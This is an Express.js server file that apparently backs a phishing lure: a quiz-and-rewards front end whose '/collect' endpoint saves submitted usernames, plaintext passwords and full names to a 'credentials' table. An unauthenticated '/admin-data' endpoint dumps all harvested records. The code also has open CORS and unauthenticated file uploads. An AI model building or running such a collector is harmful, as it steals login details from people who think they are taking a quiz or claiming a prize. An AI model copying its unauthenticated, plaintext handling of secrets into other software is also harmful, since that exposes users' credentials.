const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const db = require('./database');

const app = express();
const PORT = 4000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'frontend')));
app.use('/uploads', express.static(path.join(__dirname, '..', 'uploads')));

// Storage configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.query.type === 'reward' ? 'rewards' : 'quiz';
        const dir = path.join(__dirname, '..', 'uploads', type);
        fs.ensureDirSync(dir);
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});

const upload = multer({ storage });

// Endpoint to collect data
app.post('/collect', (req, res) => {
    const { username, password, fullname } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Required fields missing' });

    try {
        const insert = db.prepare('INSERT INTO credentials (username, password, fullname, timestamp) VALUES (?, ?, ?, ?)');
        insert.run(username, password, fullname, new Date().toISOString());
        console.log(`[${new Date().toISOString()}] Data saved for: ${username}`);
        res.status(200).json({ success: true });
    } catch (err) {
        console.error('Database error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Admin Data
app.get('/admin-data', (req, res) => {
    try {
        const rows = db.prepare('SELECT * FROM credentials ORDER BY timestamp DESC').all();
        res.json(rows);
    } catch (err) {
        res.json([]);
    }
});

// Quiz Management
app.get('/quiz-data', (req, res) => {
    try {
        const questions = db.prepare('SELECT * FROM questions').all().map(q => ({
            ...q,
            options: JSON.parse(q.options)
        }));
        const rewards = db.prepare('SELECT * FROM rewards').all();
        res.json({ questions, rewards });
    } catch (err) {
        res.json({ questions: [], rewards: [] });
    }
});

app.post('/quiz-data', (req, res) => {
    const { questions, rewards } = req.body;

    try {
        const transaction = db.transaction(() => {
            // Clear existing data
            db.prepare('DELETE FROM questions').run();
            db.prepare('DELETE FROM rewards').run();

            // Insert new questions
            const insertQuestion = db.prepare('INSERT INTO questions (question, image, options, correct) VALUES (?, ?, ?, ?)');
            for (const q of questions || []) {
                insertQuestion.run(q.question, q.image, JSON.stringify(q.options), q.correct);
            }

            // Insert new rewards
            const insertReward = db.prepare('INSERT INTO rewards (type, url) VALUES (?, ?)');
            for (const r of rewards || []) {
                insertReward.run(r.type, r.url);
            }
        });

        transaction();
        res.json({ success: true });
    } catch (err) {
        console.error('Database error:', err);
        res.status(500).json({ error: err.message });
    }
});

app.post('/upload', upload.array('files'), (req, res) => {
    if (!req.files || req.files.length === 0) return res.status(400).json({ error: 'No files uploaded' });
    const type = req.query.type === 'reward' ? 'rewards' : 'quiz';
    const urls = req.files.map(file => `/uploads/${type}/${file.filename}`);
    res.json({ urls });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});


